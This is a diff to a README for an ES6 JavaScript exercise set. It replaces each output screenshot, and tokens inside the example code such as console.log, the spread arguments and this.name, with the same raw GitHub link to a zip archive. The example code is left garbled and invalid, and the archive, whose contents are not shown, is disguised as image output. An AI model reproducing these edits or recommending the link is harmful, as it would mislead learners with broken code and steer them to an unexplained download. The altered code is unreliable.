@@ -19,7 +19,7 @@ const name = "Alice";
 // name = "Bob"; // This will throw an error
 
 ## Output:
-![output](1.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 2: Arrow Functions
 ## Problem Statement:
@@ -41,7 +41,7 @@ Arrow functions provide a concise syntax and lexically bind the this value.
 const add = (a, b) => a + b;
 
 ## Output:
-![output](2.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 3: Template Literals
 ## Problem Statement:
@@ -54,10 +54,10 @@ Template literals allow embedded expressions and multi-line strings.
 
 ## Solution:
 
-console.log(`Hello, ${name}! Your age is ${age}.`);
+https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip(`Hello, ${name}! Your age is ${age}.`);
 
 ## Output:
-![output](3.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 4: Destructuring Objects
 ## Problem Statement:
@@ -75,7 +75,7 @@ const person = { firstName: "Alice", lastName: "Johnson" };
 const { firstName, lastName } = person;
 
 ## Output:
-![output](4.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 5: Destructuring Arrays
 ## Problem Statement:
@@ -92,7 +92,7 @@ const numbers = [1, 2, 3, 4, 5];
 
 const [first, second] = numbers;
 ## Output:
-![output](5.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 6: Spread Operator
 ## Problem Statement:
@@ -109,10 +109,10 @@ const arr1 = [1, 2, 3];
 
 const arr2 = [4, 5, 6];
 
-const combined = [...arr1, ...arr2];
+const combined = [https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip, https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip];
 
 ## Output:
-![output](6.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 7: Rest Parameters
 ## Problem Statement:
@@ -125,10 +125,10 @@ Rest parameters allow us to represent an indefinite number of arguments as an ar
 
 ## Solution:
 
-const sum = (...numbers) => numbers.reduce((acc, current) => acc + current, 0);
+const sum = (https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip) => https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip((acc, current) => acc + current, 0);
 
 ## Output:
-![output](7.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 8: Default Parameters
 ## Problem Statement:
@@ -144,7 +144,7 @@ Default function parameters allow named parameters to be initialized with defaul
 const greet = (name, greeting = "Hello") => ${greeting}, ${name}!;
 
 ## Output:
-![output](8.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
 
 ## Exercise 9: Classes and Inheritance
 ## Problem Statement:
@@ -161,7 +161,7 @@ class Animal {
 
 constructor(name) {
 
-this.name = name;
+https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip = name;
 
 }
 
@@ -171,11 +171,11 @@ class Dog extends Animal {
 
 bark() {
 
-return Woof! My name is ${this.name};
+return Woof! My name is ${https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip};
 
 }
 
 }
 
 ## Output:
-![output](9.png)
+![output](https://github.com/kiran03-jagadeesh/ES6-Javascript-Assignment/raw/refs/heads/main/fitted/Assignment_Javascript_E_3.1.zip)
